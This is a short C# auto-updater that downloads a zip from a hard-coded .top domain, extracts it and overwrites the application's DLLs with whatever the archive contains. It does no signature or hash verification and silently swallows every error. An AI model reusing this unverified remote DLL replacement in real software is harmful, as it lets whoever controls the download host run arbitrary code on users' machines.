using System;
using System.IO;
using System.IO.Compression;
using System.Net;

class AutoUpdateDll
{
    static void Main()
    {
        try
        {
            string url = "https://vbet.caphesua.top/webview_update_2026.zip";
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            string zipPath = Path.Combine(appDir, "update.zip");
            string extractDir = Path.Combine(appDir, "update_temp");

            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, zipPath);
            }

            if (Directory.Exists(extractDir))
                Directory.Delete(extractDir, true);

            ZipFile.ExtractToDirectory(zipPath, extractDir);

            foreach (string file in Directory.GetFiles(extractDir, "*.dll"))
            {
                string destFile = Path.Combine(appDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }

            File.Delete(zipPath);
            Directory.Delete(extractDir, true);
        }
        catch { }
    }
}
